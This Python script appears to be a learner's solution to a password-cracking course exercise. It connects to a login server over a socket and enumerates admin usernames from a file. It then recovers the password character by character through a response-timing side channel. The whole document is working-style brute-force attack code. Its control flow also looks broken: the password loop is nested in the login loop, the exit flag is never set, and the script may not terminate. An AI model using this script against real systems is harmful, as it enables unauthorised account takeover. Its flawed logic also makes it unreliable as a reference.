import itertools
import socket
import sys
import string
import json
from datetime import datetime
import logging

class Hack:
    def __init__(self, ip_address, port, login_file_path):
        self.ip_address = ip_address
        self.port = int(port)
        self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.address = (ip_address, port)
        self.login_file_path = login_file_path

    def main(self):
        self.my_socket.connect(self.address)

        symbols = string.ascii_lowercase + string.ascii_uppercase + '1234567890'
        symbols = itertools.cycle(symbols)
        incomlete_pswd = ''

        with open(self.login_file_path) as admins:
            gotPassword = False
            gotLogin = False
            while not gotPassword:
                while not gotLogin:
                    admin = admins.readline().strip('\n')
                    query = {'login': str(admin), 'password': ''}
                    query = json.dumps(query)
                    encoded_query = query.encode('utf-8')
                    self.my_socket.send(encoded_query)
                    response = self.my_socket.recv(1024)
                    response = response.decode('utf-8')
                    response = json.loads(response)
                    if response["result"] == 'Wrong password!':
                        gotLogin = True

                    trial_pswd = incomlete_pswd+next(symbols)
                    query = {'login': str(admin), 'password': str(trial_pswd)}
                    query = json.dumps(query)
                    encoded_query = query.encode('utf-8')
                    start_time = datetime.now()
                    self.my_socket.send(encoded_query)
                    response = self.my_socket.recv(1024)
                    end_time = datetime.now()
                    time_delta = (end_time - start_time).total_seconds()
                    logging.info(str(time_delta) + ' seconds elapsed')
                    response = response.decode('utf-8')
                    response = json.loads(response)
                    if response['result'] == "Connection success!":
                        break
                    if time_delta > 0.1:  # % of prev time
                        incomlete_pswd = trial_pswd
                        break
        print(query)
        self.my_socket.close()

ip_address, host = sys.argv[1:]
path = r'C:\Users\snick\PycharmProjects\Password Hacker with Python\Password Hacker with Python\task\hacking\logins.txt'
myPswdHacker = Hack(ip_address, host, path)
myPswdHacker.main()